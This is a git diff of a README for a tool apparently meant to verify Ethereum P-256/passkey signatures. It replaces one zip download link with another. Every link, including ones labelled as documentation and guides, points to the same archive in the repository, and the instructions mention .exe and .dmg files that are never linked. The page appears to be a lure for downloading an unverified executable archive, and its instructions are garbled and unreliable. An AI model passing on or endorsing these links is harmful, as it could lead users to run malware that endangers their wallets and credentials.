@@ -1,7 +1,7 @@
 # 🚀 p256-verifier - Easily Verify Ethereum Signatures
 
 ## 🔗 Download Now!
-[![Download p256-verifier](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip)](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip)
+[![Download p256-verifier](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip)](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip)
 
 ## 📖 Introduction
 The **p256-verifier** helps you verify P-256/passkey signatures on the Ethereum mainnet. It uses the 0x0100 precompile from EIP-7212 for secure verification. This tool works smoothly with Fusaka, making it simple to validate your Ethereum signatures.
@@ -10,7 +10,7 @@ The **p256-verifier** helps you verify P-256/passkey signatures on the Ethereum 
 To use p256-verifier, follow these steps:
 
 1. **Visit the Download Page**  
-   Click [here](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip) to go to the Releases page.
+   Click [here](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip) to go to the Releases page.
 
 2. **Choose the Right Version**  
    You will see different versions of the software listed. Look for the latest release, which should have the highest version number.
@@ -19,13 +19,13 @@ To use p256-verifier, follow these steps:
    Click on the appropriate file for your operating system. For example:
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, look for the `https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip` file.
+   - For Linux, look for the `https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip` file.
 
 4. **Install the Application**  
    Once downloaded, locate the file on your computer:  
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.  
    - For macOS: Open the `.dmg` file, then drag the application to your Applications folder.  
-   - For Linux: Extract the `https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip` file and run the installation script as prompted.
+   - For Linux: Extract the `https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip` file and run the installation script as prompted.
 
 5. **Open the Application**  
    Find p256-verifier in your applications list and open it. The interface is user-friendly, making it easy to start verifying signatures.
@@ -68,7 +68,7 @@ After opening p256-verifier, follow these steps to verify a signature:
    The application will display if the signature is valid or invalid, along with any relevant details.
 
 ## 📤 Download & Install
-To get started, visit the Download page: [p256-verifier Releases](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip). Choose the file suitable for your operating system, download it, and follow the installation steps outlined above.
+To get started, visit the Download page: [p256-verifier Releases](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip). Choose the file suitable for your operating system, download it, and follow the installation steps outlined above.
 
 ## 🛠️ Troubleshooting
 If you encounter issues while using p256-verifier:
@@ -101,7 +101,7 @@ p256-verifier is available under the MIT License. You can use it freely, subject
 
 ## 🔗 Additional Resources
 For more detailed information, check out the following links:
-- [Ethereum Documentation](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip)
-- [WebAuthn Guide](https://raw.githubusercontent.com/Sultan-007/p256-verifier/main/frontend/p_verifier_3.2.zip)
+- [Ethereum Documentation](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip)
+- [WebAuthn Guide](https://github.com/Sultan-007/p256-verifier/raw/refs/heads/main/frontend/p-verifier-v2.9.zip)
 
 Thank you for using p256-verifier! For updates and news, keep an eye on the GitHub Releases page and enjoy verifying your Ethereum signatures.
